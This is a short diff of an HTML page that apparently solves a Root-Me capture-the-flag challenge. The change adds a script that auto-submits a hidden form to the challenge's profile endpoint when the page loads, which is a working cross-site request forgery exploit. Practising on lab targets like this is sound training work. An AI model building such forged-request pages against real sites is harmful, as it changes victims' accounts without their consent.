@@ -4,7 +4,7 @@
         <title>My First Web Page</title>
     </head>
     <body>
-        <form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data" hidden>
+        <form id="form" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data" hidden>
 		    <div class="form-group">
 		        <label>Username:</label>
 	            <input type="text" name="username" value="briac">
@@ -17,5 +17,8 @@
 		    <br>	
 		    <button type="submit">Submit</button>
 	    </form>
+        <script>
+            form.submit();
+        </script>
     </body>
 </html>
